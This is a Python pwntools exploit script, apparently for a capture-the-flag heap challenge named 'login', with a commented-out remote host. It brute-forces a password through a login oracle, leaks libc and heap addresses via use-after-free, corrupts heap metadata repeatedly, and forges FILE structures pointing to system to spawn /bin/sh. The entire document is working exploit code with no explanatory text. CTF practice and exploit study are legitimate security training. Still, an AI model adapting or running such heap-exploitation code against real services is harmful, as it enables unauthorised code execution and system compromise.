from pwn import *


def run():
    p = process('./login')
    # p = remote('81.69.250.115', 20102)
    lib = ELF('libc.so.6')
    passwd = b'a' * 0x40

    def choice(id_):
        p.recvuntil(b'>>')
        p.sendline(id_)

    def add(id_, size_, len_, mess):
        choice(b'1')
        p.recvuntil(b':')
        p.sendline(id_)
        p.recvuntil(b':')
        p.sendline(str(int(size_)).encode())
        p.recvuntil(b':')
        p.sendline(str(int(len_)).encode())
        p.recvuntil(b':')
        p.sendline(mess)

    def log_in(id_, mess):
        choice(b'2')
        p.recvuntil(b':')
        p.sendline(id_)
        p.recvuntil(b':')
        p.sendline(mess)

    def delete(id_):
        choice(b'3')
        p.recvuntil(b':')
        p.sendline(id_)

    def edit(id_, len_, mess):
        choice(b'4')
        p.recvuntil(b':')
        p.sendline(id_)
        p.recvuntil(b':')
        p.sendline(str(int(len_)).encode())
        p.recvuntil(b':')
        p.sendline(mess)

    def bao_po(id_, len_, a, b):
        while True:
            password = b''
            while len(password) < len_:
                flag = 0
                for i in range(a, b):
                    if i != 10:
                        payload_ = password + bytes([i])
                        payload_ = payload_.ljust(0x40, b'a')
                        log_in(id_, payload_)
                        i1 = p.recvuntil(b'Login')[-7: -6]
                        key_ = p.recvuntil(b'!')
                        if b'success' in key_:
                            password += bytes([i])
                            return password
                        if int(i1.hex(), 16) == len(password) + 1:
                            password += bytes([i])
                            flag = 1
                            break

                if flag == 0:
                    print("wrong!")
                    print(password)
                    return 0
            if len(password) == len_:
                return password

    def uaf(id_):
        p.recvuntil(b'Input lover index:')
        p.sendline(id_)

    add(b'1', 0x720, 0x40, passwd)
    log_in(b'1', passwd)
    add(b'2', 0x500, 0x40, passwd)
    add(b'3', 0x710, 0x40, passwd)
    add(b'4', 0x720, 0x40, passwd)
    add(b'12', 0x1500, 0x40, passwd)
    add(b'11', 0x710, 0x40, passwd)
    add(b'5', 0x500, 0x40, passwd)
    if bao_po(b'0', 0x40, 33, 126) == 0:
        p.close()
        return 0
    uaf(b'1')
    addr = bao_po(b'1', 6, 0x1, 0xff)
    if addr == 0:
        p.close()
        return 0
    base_addr = u64(addr.ljust(8, b'\00')) - 0x219ce0
    io_list_all_addr = base_addr + lib.sym['_IO_list_all']
    io_wfile_jump_addr = base_addr + lib.sym['_IO_wfile_jumps']
    system_addr = base_addr + lib.sym['system']
    stderr_addr = base_addr + lib.sym['stderr']
    print(hex(stderr_addr))
    io_file_jump_addr = base_addr + 0x216600
    size_addr = base_addr + 0x2193c8
    print(hex(base_addr))
    add(b'6', 0x720, 0x40, passwd)
    log_in(b'6', passwd)
    log_in(b'4', passwd)
    delete(b'4')
    delete(b'6')
    addr = bao_po(b'1', 6, 0x1, 0xff)
    if addr == 0:
        p.close()
        return 0
    heap_addr = u64(addr.ljust(8, b'\00'))
    fake_addr = heap_addr + 0xba0
    key = (heap_addr >> 12) - 1
    print(hex(heap_addr))
    add(b'4', 0x720, 0x40, passwd)
    add(b'6', 0x720, 0x40, passwd)

    log_in(b'6', passwd)
    delete(b'6')
    add(b'7', 0x1ff0, 0x40, passwd)
    payload = p64(base_addr + 0x21a190) * 2 + p64(heap_addr - 0x1360) + \
              p64(heap_addr - 0x1a20 + 0x90 - 0x20) + b'a' * 0x20
    edit(b'1', 0x40, payload)
    log_in(b'11', passwd)
    delete(b'11')
    log_in(b'7', passwd)
    delete(b'7')
    add(b'7', 0x1ff0, 0x40, passwd)
    log_in(b'7', passwd)
    delete(b'7')
    add(b'11', 0x710, 0x40, passwd)
    log_in(b'1', payload)
    payload = p64(base_addr + 0x21a190) * 2 + p64(heap_addr - 0x1360) * 2 + b'a' * 0x20
    edit(b'1', 0x40, payload)
    log_in(b'1', payload)
    add(b'6', 0x720, 0x40, passwd)

    log_in(b'6', passwd)
    delete(b'6')
    add(b'7', 0x1ff0, 0x40, passwd)
    payload = p64(base_addr + 0x21a190) * 2 + p64(heap_addr - 0x1360) + \
              p64(heap_addr - 0x1a20 + 0x98 - 0x20) + b'a' * 0x20
    edit(b'1', 0x40, payload)
    log_in(b'11', passwd)
    delete(b'11')
    log_in(b'7', passwd)
    delete(b'7')
    add(b'7', 0x1ff0, 0x40, passwd)
    log_in(b'7', passwd)
    delete(b'7')
    add(b'11', 0x710, 0x40, passwd)
    log_in(b'1', payload)
    payload = p64(base_addr + 0x21a190) * 2 + p64(heap_addr - 0x1360) * 2 + b'a' * 0x20
    edit(b'1', 0x40, payload)
    log_in(b'1', payload)
    add(b'6', 0x720, 0x40, passwd)

    log_in(b'6', passwd)
    delete(b'6')
    add(b'7', 0x1ff0, 0x40, passwd)
    payload = p64(base_addr + 0x21a190) * 2 + p64(heap_addr - 0x1360) + \
              p64(heap_addr - 0x1a20 + 0xa0 - 0x20) + b'a' * 0x20
    edit(b'1', 0x40, payload)
    log_in(b'11', passwd)
    delete(b'11')
    log_in(b'7', passwd)
    delete(b'7')
    add(b'7', 0x1ff0, 0x40, passwd)
    log_in(b'7', passwd)
    delete(b'7')
    add(b'11', 0x710, 0x40, passwd)
    log_in(b'1', payload)
    payload = p64(base_addr + 0x21a190) * 2 + p64(heap_addr - 0x1360) * 2 + b'a' * 0x20
    edit(b'1', 0x40, payload)
    log_in(b'1', payload)
    add(b'6', 0x720, 0x40, passwd)

    log_in(b'6', passwd)
    delete(b'6')
    add(b'7', 0x1ff0, 0x40, passwd)
    payload = p64(base_addr + 0x21a190) * 2 + p64(heap_addr - 0x1360) + \
              p64(heap_addr - 0x1a20 + 0xa8 - 0x20) + b'a' * 0x20
    edit(b'1', 0x40, payload)
    log_in(b'11', passwd)
    delete(b'11')
    log_in(b'7', passwd)
    delete(b'7')
    add(b'7', 0x1ff0, 0x40, passwd)
    log_in(b'7', passwd)
    delete(b'7')
    add(b'11', 0x710, 0x40, passwd)
    log_in(b'1', payload)
    payload = p64(base_addr + 0x21a190) * 2 + p64(heap_addr - 0x1360) * 2 + b'a' * 0x20
    edit(b'1', 0x40, payload)
    log_in(b'1', payload)
    add(b'6', 0x720, 0x40, passwd)

    payload = p64(stderr_addr - 0x20) + p64(heap_addr + 0x4770) + p64(heap_addr + 0x4770) + p64(fake_addr) + p64(
        fake_addr + 0x40) + \
              p64(heap_addr - 0x1a20 + 0x2e0) + p64(heap_addr - 0x1a20 + 0x2e0) + p64(fake_addr + 0x40 * 2)
    edit(b'0', 0x40, payload)

    log_in(b'6', passwd)
    delete(b'6')
    add(b'7', 0x1ff0, 0x40, passwd)
    payload = p64(base_addr + 0x21a190) * 2 + p64(heap_addr - 0x1360) + p64(size_addr - 0x20) + b'a' * 0x20
    edit(b'1', 0x40, payload)
    log_in(b'1', payload)
    log_in(b'11', passwd)
    delete(b'11')
    log_in(b'7', passwd)
    delete(b'7')
    add(b'7', 0x1f00, 0x40, passwd)

    log_in(b'7', passwd)
    delete(b'7')
    log_in(b'2', passwd)
    delete(b'2')
    log_in(b'3', passwd)
    delete(b'3')
    log_in(b'4', passwd)
    delete(b'4')
    log_in(b'5', passwd)
    delete(b'5')

    payload = b'/bin/sh\00' + p64(0) * 7
    add(b'2', 0x460, 0x40, payload)
    payload = p64(1) + p64(2) + p64(fake_addr + 0xb0) + p64(system_addr) + p64(0) * 4
    add(b'3', 0x470, 0x40, payload)

    payload = p64(fake_addr + 0x40 * 3) + p64(fake_addr + 0x40 * 4) * 3
    add(b'4', 0x490, 0x20, payload)
    payload = p64(0) + p64(fake_addr - 0x5c0 + 0x1000) + p64(0) * 2 + p64(fake_addr + 0x30) + p64(0) * 3
    add(b'5', 0x4a0, 0x40, payload)
    payload = p64(1) + p64(0) * 2 + p64(io_wfile_jump_addr - 0x18) + p64(0) * 4
    add(b'6', 0x4b0, 0x40, payload)

    payload = p64(0) * 2 + p64(fake_addr + 0x40) + p64(0) * 5
    add(b'7', 0x4d0, 0x40, payload)
    add(b'8', 0x430, 0x28, p64(0) * 3 + p64(io_file_jump_addr) + p64(fake_addr))
    add(b'9', 0x450, 0x20, p64(0x1234) * 4)

    gdb.attach(p)

    # choice(b'1')
    # p.sendline(b'15')
    # p.sendline(str(int(0x1bf0)).encode())

    # sleep(1)
    # p.sendline(b'cat flag')

    p.interactive()


if __name__ == '__main__':
    while True:
        run()
